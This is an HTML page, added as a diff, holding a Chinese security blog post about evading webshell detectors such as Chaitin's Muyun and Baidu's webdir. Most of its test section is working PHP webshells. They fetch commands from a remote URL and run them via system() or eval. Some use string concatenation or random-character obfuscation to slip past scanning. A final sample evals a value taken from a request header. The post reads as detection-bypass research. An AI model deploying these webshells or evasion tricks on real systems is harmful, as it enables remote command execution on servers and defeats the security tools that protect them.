@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"yoursite.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="背景在研究基于netfilter的后门时，我想到如果webshell可以创建af_packet、af_netlink等socket，就可以不使用$_POST、$_GET等方式获取用户输入，因为某些webshell检测方式会标记$_POST、$_GET等数据为污点，所以这种方式可以用来躲避检测。 不过很遗憾，从 https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;en&#x2F;function.socke">
+<meta property="og:type" content="article">
+<meta property="og:title" content="leveryd的个人博客">
+<meta property="og:url" content="http://yoursite.com/2022-11-05-webshell%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/index.html">
+<meta property="og:site_name" content="leveryd的个人博客">
+<meta property="og:description" content="背景在研究基于netfilter的后门时，我想到如果webshell可以创建af_packet、af_netlink等socket，就可以不使用$_POST、$_GET等方式获取用户输入，因为某些webshell检测方式会标记$_POST、$_GET等数据为污点，所以这种方式可以用来躲避检测。 不过很遗憾，从 https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;en&#x2F;function.socke">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://user-images.githubusercontent.com/1846319/200168952-48fa8873-82f4-4f56-84b6-fecf16493a2e.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/1846319/200169251-03184444-5820-4f0f-88ce-21b5739ec95a.png">
+<meta property="article:published_time" content="2022-11-05T02:56:03.263Z">
+<meta property="article:modified_time" content="2022-11-06T12:35:04.263Z">
+<meta property="article:author" content="leveryd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/1846319/200168952-48fa8873-82f4-4f56-84b6-fecf16493a2e.png">
+
+
+<link rel="canonical" href="http://yoursite.com/2022-11-05-webshell%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://yoursite.com/2022-11-05-webshell%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/","path":"2022-11-05-webshell绕过案例/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | leveryd的个人博客</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">leveryd的个人博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">测试过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">leveryd</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-11-05-webshell%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-05 10:56:03" itemprop="dateCreated datePublished" datetime="2022-11-05T10:56:03+08:00">2022-11-05</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-11-06 20:35:04" itemprop="dateModified" datetime="2022-11-06T20:35:04+08:00">2022-11-06</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在研究<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UL7Rd56MtSB6If_Tu_2N7w">基于netfilter的后门</a>时，我想到如果webshell可以创建af_packet、af_netlink等socket，就可以不使用<code>$_POST</code>、<code>$_GET</code>等方式获取用户输入，因为某些webshell检测方式会标记<code>$_POST</code>、<code>$_GET</code>等数据为污点，所以这种方式可以用来躲避检测。</p>
+<p>不过很遗憾，从 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.socket-create.php">https://www.php.net/manual/en/function.socket-create.php</a> 文档中看，socket_create不支持创建af_netlink、af_packet类型的socket。</p>
+<p>接着我又想到，我可以通过”端口复用”创建tcp服务来获取用户输入。比如和php-fpm、ssh服务做”端口复用”。</p>
+<p>在 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/lab/search?searchtitle=lnmp">https://cloud.tencent.com/lab/search?searchtitle=lnmp</a> 的实验环境里搭了一个php-fpm环境后，测试后发现无法做端口复用，应该是php-fpm服务监听的socket没有用SO_REUSEPORT选项。测试代码见 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/83038ce5b53a34435c9c0888235bf7bd">https://gist.github.com/leveryd/83038ce5b53a34435c9c0888235bf7bd</a></p>
+<p>似乎上面两种思路都不行，最后我就想webshell能不能从远程获取用户输入呢，这样也不用<code>$_POST</code>、<code>$_GET</code>等变量。沿着这个思路构造了几个样本，并在<a target="_blank" rel="noopener" href="https://stack.chaitin.com/security-challenge/webshell/index">长亭的牧云</a>、<a target="_blank" rel="noopener" href="https://scanner.baidu.com/#/pages/intro">百度的webdir</a>验证了一下检出效果。</p>
+<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><p>第一个样本如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd&#x3D;file_get_contents(&quot;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;cmd&quot;);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>
+
+<p>牧云标记出webshell，webdir没有检出。</p>
+<p>即使改成下面这种用eval、字符串拼接，牧云也可以检出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(&#39;$cmd&#x3D;file_get&#39;.&#39;_contents(&quot;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;cmd&quot;);&#39;);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/1846319/200168952-48fa8873-82f4-4f56-84b6-fecf16493a2e.png"></p>
+<p>不过加入随机数后，牧云就无法检出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function rand_char()&#123;</span><br><span class="line">        $s &#x3D; substr(str_shuffle(str_repeat(&quot;1t&quot;,1)), 0, 1); &#x2F;&#x2F; 从&quot;1&quot;和&quot;t&quot;中随机选择一个字符</span><br><span class="line">        return $s;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;rand_char();</span><br><span class="line">eval(&#39;$cmd&#x3D;file_ge&#39;.$r.&#39;_contents(&quot;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;cmd&quot;);&#39;);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/1846319/200169251-03184444-5820-4f0f-88ce-21b5739ec95a.png"></p>
+<blockquote>
+<p>rand、mt_rand 生成的随机数，牧云是可以检出的</p>
+</blockquote>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最开始的思路是想避免<code>$_POST</code>、<code>$_GET</code>等常见方式获取用户输入，最终绕过还是得靠不常见的随机数函数。</p>
+<blockquote>
+<p>file_get_contents也可以改成socket，代码见 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/896b9fba137aa2d12ce8c7737d451852">https://gist.github.com/leveryd/896b9fba137aa2d12ce8c7737d451852</a></p>
+</blockquote>
+<p>PS：<br>在研究过程中，发现一个似乎比较少见的获取header的api，测试发现也可以绕过webdir</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$headers&#x3D;apache_request_headers();</span><br><span class="line">eval($headers[&quot;X-TARGET&quot;]);</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022-10-13-%E6%B5%85%E8%B0%88%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">leveryd</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
